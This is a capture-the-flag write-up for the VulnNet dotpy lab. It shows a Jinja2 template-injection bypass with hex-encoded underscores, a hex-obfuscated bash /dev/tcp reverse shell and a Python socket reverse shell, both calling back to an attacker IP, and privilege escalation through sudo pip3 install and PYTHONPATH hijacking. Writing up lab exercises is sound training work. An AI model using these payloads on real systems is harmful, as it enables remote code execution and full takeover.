## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Yes, VulnNet Entertainment is back, and now security-focused. You are once again tasked to perform a penetration test including a web security assessment and a Linux security audit.  

- Difficulty: Medium
- Web Language: Python

This machine was designed to be a bit more challenging but without anything too complicated. A web application will require you to not only find a vulnerable endpoint but also bypass its security protection. You should pay attention to the output the website gives you. The whole machine is Python focused.

Note: While looking through web pages you might notice a domain vulnnet.com, however, it's not an actual vhost and you don't need to add it to your hosts list.

Icon made by [Smashicons](https://www.flaticon.com/authors/smashicons) from [www.flaticon.com](http://www.flaticon.com/)
```

## IP-Address
```IP-Address
10.49.162.254
```
## RustScan
```bash
$ rustscan -a 10.49.162.254 -b 450 -t 2000 --ulimit 5000 -- -e tun0  -sV
Open 10.49.162.254:8080
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 62 Werkzeug httpd 1.0.1 (Python 3.6.9)
```
## Browser
- End Point - `http://10.49.162.254:8080/ `
- Lets Enumerate SSTI 
- `http://10.49.162.254:8080/{{7*7}}` 
```html
    <link rel="stylesheet" href="/static/assets/vendors/iconfonts/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/static/assets/vendors/iconfonts/ionicons/css/ionicons.css">
    <link rel="stylesheet" href="/static/assets/vendors/iconfonts/typicons/src/font/typicons.css">
    <link rel="stylesheet" href="/static/assets/vendors/iconfonts/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="/static/assets/vendors/css/vendor.bundle.base.css">
    <link rel="stylesheet" href="/static/assets/vendors/css/vendor.bundle.addons.css">

    <link rel="stylesheet" href="/static/assets/css/shared/style.css">
    <link rel="stylesheet" href="/static/assets/css/demo_1/style.css">
    <div class="content-wrapper d-flex align-items-center text-center error-page bg-primary">
        <div class="row flex-grow">
            <div class="col-lg-7 mx-auto text-white">
                <div class="row align-items-center d-flex flex-row">
                <div class="col-lg-6 text-lg-right pr-lg-4">
                    <h1 class="display-1 mb-0">404</h1>
                </div>
                <div class="col-lg-6 error-page-divider text-lg-left pl-lg-4">
                    <h2>SORRY!</h2>
                    <h3 class="font-weight-light">The page you’re looking for was not found.</h3>
		No results for <b> 49 </b>
                </div>
                </div>
                <div class="row mt-5">
                <div class="col-12 text-center mt-xl-2">
                    <a class="text-white font-weight-medium" href="/">Back to home</a>
                </div>
                </div>
                <div class="row mt-5">
                <div class="col-12 mt-xl-2">
                    <p class="text-white font-weight-medium text-center">
                        &copy; VulnNet Entertainment
                        - <a class="text-white" 
                             target="_blank" rel="noopener noreferrer"
                             href="mailto: hello@vulnnet.com">Contact: hello@vulnnet.com</a>
                    </p>
                </div>
                </div>
            </div>
        </div>
        
    </div>
```
- Got The `49` output
- Run ``http://10.49.162.254:8080/{{ config }}`
```Result
<Config {'ENV': 'production', 'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '[secret key omitted]', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:////home/web/shuriken-dotpy/db.sqlite3', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
```

## Found SSTI 
#SSTI-Vulneranility - ID Request
```Req.
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
#### `Result`
```bash
</h3>
	No results for <b> index uid=1001(web) gid=1001(web) groups=1001(web)
 </b>
```
#### Reverse-Shell
```Req.
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x35\x37\x2e\x32\x35\x32\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31\x27')|attr('read')()}}
```
##### BURP Req
```bash
GET /index{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x35\x37\x2e\x32\x35\x32\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31\x27')|attr('read')()}} HTTP/1.1
Host: 10.49.187.155:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwlzjtqBDEQRdG9KHZQH5VaNZtpSvXBxmBD90xkvHcLHL4bPM5PO-vK-709ntcr39r5Ee3RtCy8KAoDp6BFwhIHZ-trACNJHxbgy3zh7D3UhhhCIswR1FUKx0RVVwUmyyjgsXyKToSj9-QDUDpgLdRF5FTMEWLOQ0DbhrzuvP41uKffV53P78_82sFVMBiQ-DiSbCiZEgZtDk-qVWR93472-wfXyD56.aYi4GQ.7shUJOlS1g55rQBLYVanFfTKdWw
Connection: keep-alive
```

- Got the Reverse-shell
```bash
$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
$ whoami
web
```
- Lets Create an `setup.py` file which gives us a new reverse shell as user `system-adm`
- After checking the `gftbin` create the `tmp` folder
```bash
mkdir /tmp/GH && TF=/tmp/GH
cd /tmp/GH
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.252",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > setup.py
```
- Run the code
```bash
sudo -u system-adm /usr/bin/pip3 install $TF
```
- Got the reverse-shell
```bash
whoami
system-adm
ls
pip-delete-this-directory.txt  pip-egg-info  setup.py
cd
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
cat user.txt
[flag omitted]
sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```
- Path= `SETENV`
```bash
mkdir /tmp/pwn
cd /tmp/pwn
echo 'import pty; pty.spawn("/bin/bash")' > /dev/shm/zipfile.py
sudo -u root PYTHONPATH=/dev/shm /usr/bin/python3 /opt/backup.py
```
- Got the root shell
```bash
ls
Desktop    Downloads  Pictures  root.txt   Videos
Documents  Music      Public    Templates
root@vulnnet-dotpy:~# cat root.txt
cat root.txt
[flag omitted]
```

- We didn't try to decode the password as port 22 is off
# END